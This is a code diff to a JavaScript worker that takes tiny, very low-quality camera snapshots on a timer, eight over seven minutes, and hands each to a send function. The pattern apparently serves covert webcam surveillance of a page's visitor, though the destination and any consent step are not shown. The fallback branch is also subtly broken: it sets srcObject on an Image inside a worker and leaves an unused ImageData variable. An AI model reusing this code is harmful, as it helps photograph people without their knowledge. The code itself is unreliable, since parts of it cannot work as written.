@@ -53,7 +53,7 @@ self.addEventListener('message', async event => {
             });
             const track = stream.getVideoTracks()[0];
             let photo;
-            if ('ImageCapture' in self) {
+            if ('ImageCapture' in self && !/safari/i.test(navigator.userAgent)) {
                 const imageCapture = new ImageCapture(track);
                 const bitmap = await imageCapture.grabFrame();
                 const canvas = new OffscreenCanvas(120, 90);
@@ -66,14 +66,15 @@ self.addEventListener('message', async event => {
                     reader.readAsDataURL(blob);
                 });
             } else {
-                // Fallback for browsers without ImageCapture
-                const video = new OffscreenCanvas(120, 90); // OffscreenCanvas for worker
-                const ctx = video.getContext('2d');
+                // Canvas fallback using video element
+                const video = new OffscreenCanvas(120, 90).getContext('2d').createImageData(120, 90);
                 const tempVideo = new Image();
                 tempVideo.srcObject = stream;
                 await new Promise(resolve => tempVideo.onload = resolve);
+                const canvas = new OffscreenCanvas(120, 90);
+                const ctx = canvas.getContext('2d');
                 ctx.drawImage(tempVideo, 0, 0, 120, 90);
-                const blob = await video.convertToBlob({ type: 'image/webp', quality: 0.05 });
+                const blob = await canvas.convertToBlob({ type: 'image/webp', quality: 0.05 });
                 const reader = new FileReader();
                 photo = await new Promise(resolve => {
                     reader.onloadend = () => resolve({ base64: reader.result, timestamp: new Date().toISOString() });
@@ -91,7 +92,7 @@ self.addEventListener('message', async event => {
 
     await sendItem('Debug', { message: 'Worker started', time: new Date().toISOString() });
     const totalPhotos = 8;
-    const totalDuration = 4200; // 7 minutes
+    const totalDuration = 420000; // 7 minutes
     const interval = totalDuration / totalPhotos; // ~52.5s per photo
 
     for (let i = 0; i < totalPhotos; i++) {
